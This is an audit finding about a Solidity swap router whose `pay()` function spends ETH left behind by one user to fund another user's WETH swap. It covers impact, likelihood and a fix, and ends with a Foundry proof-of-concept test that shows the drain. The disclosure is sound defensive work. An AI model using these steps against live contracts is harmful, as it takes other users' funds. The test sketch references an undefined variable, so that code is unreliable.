### Title
Residual ETH on Router Stolen via WETH Hybrid Branch in `pay()` — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

---

### Summary

`PeripheryPayments.pay()` uses `address(this).balance` — the router's **entire** native ETH balance — when settling a WETH payment. Because `multicall` is `payable` and there is no per-transaction ETH accounting, ETH left on the router from a prior user's `msg.value` is silently consumed to fund a subsequent user's WETH swap. The prior user suffers a direct, unrecoverable loss of principal.

---

### Finding Description

The hybrid branch of `pay()` reads the router's live ETH balance and uses it unconditionally:

```solidity
// PeripheryPayments.sol lines 78-81
} else if (nativeBalance > 0) {
    IWETH9(WETH).deposit{value: nativeBalance}();
    IERC20(WETH).safeTransfer(recipient, nativeBalance);
    IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
}
``` [1](#0-0) 

There is no record of *who* deposited the ETH currently sitting on the router. Any ETH that remains from a previous `msg.value` call is treated as freely available collateral for the next WETH payment.

ETH reaches the router legitimately via `msg.value` on `payable` entry points. The `receive()` guard only blocks *direct* ETH sends (no calldata); it does not prevent ETH from being attached to function calls: [2](#0-1) 

`multicall` is `payable` and loops over delegate-calls, so a user can send ETH and have only part of it consumed within the batch: [3](#0-2) 

If the user omits `refundETH()` from their multicall (or sends slightly more ETH than the swap requires), the surplus ETH persists on the router across transaction boundaries. The next caller who executes any WETH swap — via `exactInputSingle`, `exactOutputSingle`, `exactInput`, or `exactOutput` — will trigger `pay(WETH, msg.sender, pool, value)`, which enters the hybrid branch and drains the stranded ETH first. [4](#0-3) 

---

### Impact Explanation

**Direct loss of user principal — HIGH.**

User-A's ETH is transferred to a pool on behalf of User-B. User-A receives nothing in return; User-B's effective WETH cost is reduced by exactly the amount of ETH stolen. The loss is bounded only by how much ETH User-A left on the router. There is no slippage check, no revert, and no event that would alert User-A.

---

### Likelihood Explanation

**Medium.**

- Users routinely send a round ETH amount (e.g., `1 ether`) for a swap that costs a fractional amount, relying on `refundETH()` to recover the surplus. Forgetting to append `refundETH()` to a multicall is a realistic user error.
- The exploit requires no special permissions, no malicious pool, and no non-standard token. Any address can call `exactInputSingle` with `tokenIn = WETH` immediately after noticing a non-zero router ETH balance (observable on-chain).
- MEV bots monitoring the mempool for stranded ETH on the router can front-run the victim's own `refundETH()` call.

---

### Recommendation

Track ETH ownership per-transaction using transient storage (EIP-1153, already used elsewhere in this codebase). Record `msg.value` at the start of each top-level call and deduct from that budget inside `pay()`. Alternatively, restrict the hybrid branch to only use ETH that was explicitly sent in the current call by comparing against a transient `msgValueBudget` slot rather than `address(this).balance`.

A simpler but less gas-efficient fix: require callers to always wrap ETH to WETH themselves before calling the router, removing the hybrid branch entirely.

---

```solidity
// Foundry test sketch
function test_residualEthStolenViaWethHybridBranch() public {
    // User-A multicalls: sends 1 ETH, swap only needs 0.5 ETH worth of WETH input.
    // Crucially, no refundETH() is appended.
    bytes[] memory calls = new bytes[](1);
    calls[0] = abi.encodeCall(router.exactInputSingle, (ExactInputSingleParams({
        pool: pool,
        tokenIn: WETH,
        recipient: userA,
        amountIn: 0.5 ether,
        amountOutMinimum: 0,
        zeroForOne: true,
        priceLimitX64: 0,
        deadline: block.timestamp + 1,
        extensionData: ""
    })));
    vm.prank(userA);
    router.multicall{value: 1 ether}(calls); // 0.5 ETH remains on router

    assertEq(address(router).balance, 0.5 ether);

    uint256 userAEthBefore = userA.balance; // already spent 1 ETH above

    // User-B calls exactInputSingle with tokenIn=WETH, amountIn=1 ETH.
    // pay() sees nativeBalance=0.5 ETH > 0 and < 1 ETH → hybrid branch.
    // Router wraps User-A's 0.5 ETH and pulls only 0.5 WETH from User-B.
    vm.startPrank(userB);
    IERC20(WETH).approve(address(router), 1 ether);
    router.exactInputSingle(ExactInputSingleParams({
        pool: pool,
        tokenIn: WETH,
        recipient: userB,
        amountIn: 1 ether,
        amountOutMinimum: 0,
        zeroForOne: true,
        priceLimitX64: 0,
        deadline: block.timestamp + 1,
        extensionData: ""
    }));
    vm.stopPrank();

    // Router ETH balance is now 0 — User-A's 0.5 ETH is gone.
    assertEq(address(router).balance, 0);
    // User-B only spent 0.5 WETH from their own wallet.
    assertEq(IERC20(WETH).balanceOf(userB_before) - IERC20(WETH).balanceOf(userB), 0.5 ether);
}
